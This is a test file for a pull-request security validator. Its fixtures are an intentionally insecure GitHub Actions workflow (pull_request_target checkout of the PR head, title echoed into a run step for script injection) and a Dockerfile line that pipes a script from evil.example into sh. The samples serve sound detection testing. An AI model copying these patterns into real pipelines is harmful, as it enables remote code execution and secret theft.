import type { FileAccessor, PrContext, ValidatorContext } from '@pr-reviewer/core'
import { describe, expect, it } from 'vitest'
import { workflowSecurityValidator } from './workflow-security.js'

function ctxWith(files: Array<{ path: string; text: string }>): ValidatorContext {
  const pr: PrContext = {
    schemaVersion: 1,
    ref: { host: 'github.com', owner: 'o', repo: 'r', number: 1 },
    title: 'CI update',
    body: '',
    author: 'dev',
    state: 'open',
    draft: false,
    baseRef: 'main',
    headRef: 'ci',
    baseSha: 'b',
    headSha: 'h',
    mergeBaseSha: 'm',
    fromFork: false,
    files: files.map((f) => ({ path: f.path, status: 'modified', additions: f.text.split('\n').length, deletions: 0, binary: false, patchTruncated: false, head: { text: f.text } })),
    reviews: [],
    reviewComments: [],
    issueComments: [],
    truncated: [],
  }
  const accessor: FileAccessor = { read: async () => undefined, list: async () => undefined, exists: async () => false, notes: () => [] }
  return { pr, files: accessor, projects: [], checks: [], repoSettings: {}, sandbox: new Map() }
}

describe('workflowSecurityValidator', () => {
  it('flags pull_request_target checkout, script injection, unpinned actions, and missing permissions', async () => {
    const wf = [
      'on: pull_request_target',
      'jobs:',
      '  test:',
      '    runs-on: ubuntu-latest',
      '    steps:',
      '      - uses: actions/checkout@v4',
      '        with:',
      '          ref: ${{ github.event.pull_request.head.sha }}',
      '      - uses: thirdparty/setup@v2',
      '      - run: echo "${{ github.event.pull_request.title }}"',
    ].join('\n')
    const out = await workflowSecurityValidator.run(ctxWith([{ path: '.github/workflows/ci.yml', text: wf }]), { now: () => 0 })
    const rules = out.findings.map((f) => f.ruleId)
    expect(rules).toEqual(
      expect.arrayContaining([
        'workflow/pull-request-target-checkout',
        'workflow/unpinned-action',
        'workflow/script-injection',
        'workflow/missing-permissions',
      ]),
    )
    expect(out.layers[0]).toMatchObject({ layer: 'SECURITY', status: 'FAILED' })
  })

  it('flags Dockerfile :latest, curl|sh, and root user while passing clean hardened Dockerfiles', async () => {
    const bad = ['FROM node:latest', 'RUN curl -fsSL https://evil.example/install.sh | sh', 'CMD ["node", "index.js"]'].join('\n')
    const outBad = await workflowSecurityValidator.run(ctxWith([{ path: 'Dockerfile', text: bad }]), { now: () => 0 })
    expect(outBad.findings.map((f) => f.ruleId)).toEqual(
      expect.arrayContaining(['container/latest-tag', 'container/pipe-to-shell', 'container/no-nonroot-user']),
    )

    const good = ['FROM node:22-alpine@sha256:0123456789abcdef', 'USER node', 'CMD ["node", "index.js"]'].join('\n')
    const outGood = await workflowSecurityValidator.run(ctxWith([{ path: 'Dockerfile', text: good }]), { now: () => 0 })
    expect(outGood.findings).toEqual([])
    expect(outGood.layers[0]).toMatchObject({ layer: 'SECURITY', status: 'PASSED' })
  })
})
